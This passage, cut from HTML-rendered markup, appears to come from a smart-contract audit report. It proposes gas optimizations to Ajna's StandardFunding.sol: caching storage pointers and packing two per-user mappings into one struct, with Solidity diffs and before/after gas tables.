class=\"grvsc-source\"><span class=\"mtk8\">-        hasVotedExtraordinary[proposalId_][msg.sender] = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _hasVoted[msg.sender] = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit VoteCast(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             msg.sender,</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L248-L255\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L248-L255</a></p>\n<p><em>Gas Savings for <code>GrantFund.claimDelegateReward</code>, obtained via protocol’s tests: Avg 64 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>65340</td>\n</tr>\n<tr>\n<td>After</td>\n<td>65276</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"cache-storage-pointer-for-hasclaimedrewardsdistributionid_\" style=\"position:relative;\"><a href=\"#cache-storage-pointer-for-hasclaimedrewardsdistributionid_\" aria-label=\"cache storage pointer for hasclaimedrewardsdistributionid_ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache storage pointer for <code>hasClaimedRewards[distributionId_]</code></h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"167\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">248</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hasClaimedReward</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">]) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RewardAlreadyClaimed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">249</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">250</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">QuadraticVoter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voter</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_quadraticVoters</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">251</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">252</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// calculate rewards earned for voting</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">253</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">rewardClaimed_</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getDelegateReward</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voter</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">254</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">255</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">hasClaimedReward</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"168\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..623b47a 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -245,14 +245,15 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if(block.number &lt; _getChallengeStageEndBlock(currentDistribution.endBlock)) revert ChallengePeriodNotEnded();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check rewards haven&#39;t already been claimed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if(hasClaimedReward[distributionId_][msg.sender]) revert RewardAlreadyClaimed();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        mapping(address =&gt; bool) storage _hasClaimedReward = hasClaimedReward[distributionId_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if(_hasClaimedReward[msg.sender]) revert RewardAlreadyClaimed();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         QuadraticVoter memory voter = _quadraticVoters[distributionId_][msg.sender];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // calculate rewards earned for voting</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         rewardClaimed_ = _getDelegateReward(currentDistribution, voter);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        hasClaimedReward[distributionId_][msg.sender] = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _hasClaimedReward[msg.sender] = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit DelegateRewardClaimed(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             msg.sender,</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L706-L743\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L706-L743</a></p>\n<p><em>Gas Savings for <code>GrantFund.screeningVote</code>, obtained via protocol’s tests: Avg 1850 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>399146</td>\n</tr>\n<tr>\n<td>After</td>\n<td>397296</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"cache-storage-pointer-for-screeningvotescastdistributionid\" style=\"position:relative;\"><a href=\"#cache-storage-pointer-for-screeningvotescastdistributionid\" aria-label=\"cache storage pointer for screeningvotescastdistributionid permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache storage pointer for <code>screeningVotesCast[distributionId]</code></h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"169\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">706</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">screeningVotesCast</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">account_</span><span class=\"mtk1\">] + </span><span class=\"mtk12\">votes_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">_getVotesScreening</span><span class=\"mtk1\">(</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">account_</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InsufficientVotingPower</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">743</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">screeningVotesCast</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposal_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">account_</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">votes_</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"170\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..094a83c 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -703,7 +703,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint24 distributionId = proposal_.distributionId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check that the voter has enough voting power to cast the vote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (screeningVotesCast[distributionId][account_] + votes_ &gt; _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        mapping(address =&gt; uint256) storage _screeningVotesCast = screeningVotesCast[distributionId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (_screeningVotesCast[account_] + votes_ &gt; _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256[] storage currentTopTenProposals = _topTenProposals[distributionId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 proposalId = proposal_.proposalId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -740,7 +741,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // record voters vote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        screeningVotesCast[proposal_.distributionId][account_] += votes_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _screeningVotesCast[account_] += votes_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // emit VoteCast instead of VoteCastWithParams to maintain compatibility with Tally</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit VoteCast(</span></span></span></code></pre>\n<h2 id=\"g-07-multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate\" style=\"position:relative;\"><a href=\"#g-07-multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate\" aria-label=\"g 07 multiple address mappings can be combined into a single mapping of an address to a struct where appropriate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-07] Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate</h2>\n<p>We can combine multiple mappings below into structs. We can then pack the structs by modifying the <code>uint type</code> for the values. This will result in cheaper storage reads since multiple mappings are accessed in functions and those values are now occupying the same storage slot, meaning the slot will become warm after the first SLOAD. In addition, when writing to and reading from the struct values we will avoid a <code>Gsset (20000 gas)</code> and <code>Gcoldsload (2100 gas)</code> since multiple struct values are now occupying the same slot.</p>\n<p><strong>Note: These are instances missed by the automated report</strong></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L106-L112\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L106-L112</a></p>\n<p><em>Gas Savings for <code>GrantFund.claimDelegateReward</code>, obtained via protocol’s tests: Avg 22146 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>65340</td>\n</tr>\n<tr>\n<td>After</td>\n<td>43194</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"171\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hasClaimedReward</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">108</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">109:     * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> Mapping of distributionId to user address to total votes cast on screening stage proposals.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">110:     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> distributionId =&gt; address =&gt; uint256</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">111:    */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">112</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">screeningVotesCast</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"172\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..9985766 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -99,17 +99,12 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     mapping(uint256 =&gt; bool) internal _isSurplusFundsUpdated;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    /**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-     * @notice Mapping of distributionId to user address to whether user has claimed his delegate reward</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-     * @dev distributionId =&gt; address =&gt; bool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    mapping(uint256 =&gt; mapping(address =&gt; bool)) public hasClaimedReward;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    struct UserInfo {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint248 screeningVotesCast;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        bool hasClaimedReward;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    /**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-     * @notice Mapping of distributionId to user address to total votes cast on screening stage proposals.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-     * @dev distributionId =&gt; address =&gt; uint256</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    mapping(uint256 =&gt; mapping(address =&gt; uint256)) public screeningVotesCast;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    mapping(uint256 =&gt; mapping(address =&gt; UserInfo)) public userInfo;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /**************************************************/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /*** Distribution Management Functions External ***/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -237,7 +232,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint24 distributionId_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external override returns(uint256 rewardClaimed_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Revert if delegatee didn&#39;t vote in screening stage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if(screeningVotesCast[distributionId_][msg.sender] == 0) revert DelegateRewardInvalid();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        UserInfo storage _userInfo = userInfo[distributionId_][msg.sender];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if(_userInfo.screeningVotesCast == 0) revert DelegateRewardInvalid();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         QuarterlyDistribution memory currentDistribution = _distributions[distributionId_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -245,14 +241,14 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if(block.number &lt; _getChallengeStageEndBlock(currentDistribution.endBlock)) revert ChallengePeriodNotEnded();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check rewards haven&#39;t already been claimed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if(hasClaimedReward[distributionId_][msg.sender]) revert RewardAlreadyClaimed();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if(_userInfo.hasClaimedReward) revert RewardAlreadyClaimed();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         QuadraticVoter memory voter = _quadraticVoters[distributionId_][msg.sender];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // calculate rewards earned for voting</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         rewardClaimed_ = _getDelegateReward(currentDistribution, voter);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        hasClaimedReward[distributionId_][msg.sender] = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _userInfo.hasClaimedReward = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit DelegateRewardClaimed(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             msg.sender,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -703,7 +699,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint24 distributionId = proposal_.distributionId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check that the voter has enough voting power to cast the vote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (screeningVotesCast[distributionId][account_] + votes_ &gt; _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        UserInfo storage _userInfo = userInfo[distributionId][account_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (_userInfo.screeningVotesCast + votes_ &gt; _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256[] storage currentTopTenProposals = _topTenProposals[distributionId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 proposalId = proposal_.proposalId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -740,7 +737,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // record voters 